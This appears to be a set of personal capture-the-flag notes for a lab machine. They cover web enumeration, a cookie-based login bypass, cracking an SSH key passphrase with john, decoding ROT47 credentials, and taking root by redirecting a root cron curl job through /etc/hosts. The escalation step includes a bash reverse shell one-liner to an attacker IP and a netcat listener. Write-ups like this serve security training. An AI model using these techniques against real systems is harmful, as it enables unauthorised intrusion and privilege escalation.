@@ -1,0 +1,54 @@
+Of course, start with an NMAP
+	We see port 22 and port 80 open
+	we find a website on port 80
+Lets use gobuster
+	with both big.txt and medium.txt we find an admin page
+	medium.txt showed us more pages faster
+	admin only shows us so much, however downloads shows us the source code
+	we also see the build code, more on that later
+	lets go back to admin, and we can see that the login is .js so it is using a javascript code
+	click on debugger
+looking at login.js
+	we can see that cookies are no actually set, the status or Cookies area is assigned as the cookie value, but the cookie is not validated
+	this should mean we can change the cookies to anything but incorrect value and create a session
+	put in the following command
+		Cookies.set("SessionToken", 'myCookieValue')
+		Now refresh the page
+We have some SSH keys
+	Copy and save those ssh keys in a nano file, james_rsa
+	Now put the nano file into something john the ripper can understand
+		python /usr/share/john/ssh2john.py james_rsa > crack
+	Now use john to crack the wordlist
+		john --wordlist=/usr/share/wordlists/rockyou.txt crack
+	Now ssh in with sudo
+		sudo ssh -i james_rsa james@10.10.4.215
+We are in
+	ls -la
+	cat user.txt
+	cat todo.txt
+		we see update overpass encryption
+	cat .overpass (to try and see encryption)
+		we see it is ROT47 due to the characters included, such as the , > ? = :
+		decode this and we get the following
+			[{"name":"System","pass":"saydrawnlyingpicture"}]t	
+		That is no the password, however the script talks about an automate build script
+		Within Linux buildscripts happen in the crontab
+		We can see that end the end we have a root curl overpass script (no questions asked)
+		Lets trick curl to download a script that we make called buildscript.sh
+		nano /etc/hosts
+			go to thm
+			change IP address to your kali linux tunnel IP
+		There are hundreds of different scripts you can create, just need to give yourself root access
+			bash -i >& /dev/tcp/10.9.124.138/4444 0>&1 
+			MAKE SURE YOU PUT IN YOUR OWN IP ABOVE
+On Kali machine make a new directory at home
+mkdir /www/downloads/src
+		sudo nano buildscript.sh
+	save the above script as buildscript.sh
+	from here utilize net cat to listen
+		nc -lvnp 4444
+	now turn on a simple http server
+		sudo python -m SimpleHTTPServer 80
+Wait one minute and your script will be downloaded, thus allowing you to be root
+	ls -la
+	cat root.txt
